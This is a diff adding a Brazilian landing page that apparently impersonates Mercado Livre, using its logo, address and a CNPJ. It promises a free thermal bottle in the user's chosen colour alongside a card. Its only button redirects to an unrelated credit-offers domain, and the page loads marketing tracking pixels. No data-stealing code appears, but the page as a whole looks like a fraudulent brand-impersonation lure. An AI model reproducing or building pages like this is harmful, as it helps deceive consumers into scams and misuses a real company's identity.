@@ -1,0 +1,242 @@
+
+<!DOCTYPE html><html lang="pt-BR"><head>
+    
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+<script>
+  window.pixelId = "68dc9a692aa590745b1509ad";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link rel="stylesheet" href="css/1NOTpeCLfvM4.css">
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;700&display=swap" rel="stylesheet">
+    <title>Cartão</title>
+    <script src="../../../cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+<script>
+    window.pixelId = "680465d10b6ade7f0dfbd4ab";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "../../../cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Sora', sans-serif;
+            background-color: #ffffff;
+            text-align: center;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            border-bottom: 1px solid #aa9900;
+            background-color: #FFE600;
+        }
+        .logo {
+            width: 125px;
+            margin-left: 20px;
+            padding: 10px;
+        }
+        .container {
+            max-width: 600px;
+            margin: 20px auto;
+            padding: 0 20px;
+        }
+        h1 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 30px;
+        }
+        .color-options {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin: 30px 0;
+        }
+        .color-option {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            border: 2px solid transparent;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        .color-option:hover {
+            transform: scale(1.1);
+        }
+        .color-option.selected {
+            border-color: #FFE600;
+        }
+        .card {
+            background: linear-gradient(45deg, #efa000, #FFE600);
+            border-radius: 15px;
+            padding: 20px;
+            height: 165px;
+            position: relative;
+            margin-bottom: 30px;
+        }
+        .card-top {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 100px;
+        }
+        .card-bottom {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+        }
+        .card-name {
+            font-family: 'Sora', sans-serif;
+            font-size: 14px;
+            color: rgb(0, 0, 0);
+        }
+        .continue-btn {
+            background-color: #FFE600;
+            color: #1c1c1c;
+            padding: 15px 40px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .button {
+            background-color: #FFE600;
+            color: #1c1c1c;
+            padding: 15px;
+            border-radius: 8px;
+            border: none;
+            width: 100%;
+            font-family: 'Sora', sans-serif;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="https://i.ibb.co/sp4Np7Yq/oie-transparent.png" alt="Logo Mercado Livre" class="logo">
+    </div>
+
+    <div class="container">
+        <h1 style="text-align: center; font-size: 17px;">Para começarmos bem nossa relação ☺️</h1>
+        <p style="text-align: center; font-size: 13px; color: #666; margin-bottom: 30px;">Como presente de Boas-Vindas, vamos te enviar de graça junto do seu cartão uma Garrafa Térmica de 1,2L. Escolha a cor da sua:</p>
+
+        <div class="color-options">
+            <div class="color-option selected" style="background: #000000" onclick="changeBottleColor('Preto')"></div>
+            <div class="color-option" style="background: #FFB6C1" onclick="changeBottleColor('Rosa')"></div>
+            <div class="color-option" style="background: #ececec" onclick="changeBottleColor('Branco')"></div>
+        </div>
+
+        <p>Cor escolhida: <span id="selectedColor" style="font-weight: bold;"></span></p>
+
+        <script>
+            function changeBottleColor(color) {
+                // Atualiza a seleção visual
+                document.querySelectorAll('.color-option').forEach(option => {
+                    option.classList.remove('selected');
+                });
+                event.target.classList.add('selected');
+
+                // Atualiza o texto da cor selecionada
+                document.getElementById('selectedColor').textContent = color;
+
+                // Salva a cor selecionada no localStorage
+                localStorage.setItem('bottleColor', color);
+            }
+
+            // Carrega a cor salva ao iniciar a página
+            window.addEventListener('load', () => {
+                const savedColor = localStorage.getItem('bottleColor');
+                if (savedColor) {
+                    document.getElementById('selectedColor').textContent = savedColor;
+                    // Seleciona visualmente a cor salva
+                    document.querySelectorAll('.color-option').forEach(option => {
+                        if (option.getAttribute('onclick').includes(savedColor)) {
+                            option.classList.add('selected');
+                        }
+                    });
+                } else {
+                    // Define Preto como cor padrão
+                    document.getElementById('selectedColor').textContent = 'Preto';
+                }
+            });
+        </script>
+
+        <img src="https://i.ibb.co/Fbfthgns/brinde.png" alt="Brinde" style="width: 100%; margin-bottom: 30px; border-radius: 15px;">
+
+        <div style="background-color: #fff9e6; padding: 15px; border-radius: 8px; margin: 20px 0; border: 1px solid #ffe0b2; display: flex; align-items: flex-start; gap: 12px; margin-top: -20px;">
+            <div style="color: #d76f00; font-size: 20px;"><i class="fas fa-gift"></i></div>
+            <div>
+                <div style="color: #d76f00; font-size: 13px; line-height: 1.4; text-align: left;">Esse brinde especial é um presente para nossos clientes, queremos que nossa boa relação dure anos. Obrigado por ser um cliente exemplar! 😊</div>
+            </div>
+        </div>
+
+       <button onclick="window.location.href='https://ofertasdecredito.digital/obrigado'" class="button">
+    Continuar
+</button>
+
+
+        <footer style="padding: 10px 15px; text-align: center; margin-top: 50px; background-color: #f9f9f9; border-top: 1px solid #eaeaea; font-family: 'Sora', sans-serif;">
+            <div style="max-width: 600px; margin: 0 auto;">
+                <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
+                    Mercado Livre Brasil LTDA | CNPJ: 79.379.491.0008-50
+                </p>
+                <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
+                    Av. das Nações Unidas, 3000 - Bonfim, Osasco - SP, 06233-903
+                </p>
+                <p style="color: #999; font-size: 9px; margin-top: 5px;">
+                    © 2025 - Todos os direitos reservados
+                </p>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+            function getUrlParams() {
+                const params = {};
+                const queryString = window.location.search;
+                const urlParams = new URLSearchParams(queryString);
+                
+                for (const [key, value] of urlParams) {
+                    params[key] = value;
+                }
+                return params;
+            }
+
+            function buildUrlWithParams(baseUrl) {
+                const params = getUrlParams();
+                const url = new URL(baseUrl, window.location);
+                Object.keys(params).forEach(key => {
+                    url.searchParams.append(key, params[key]);
+                });
+                
+                return url.toString();
+            }
+    </script>
+
+
+
+
+</body></html>
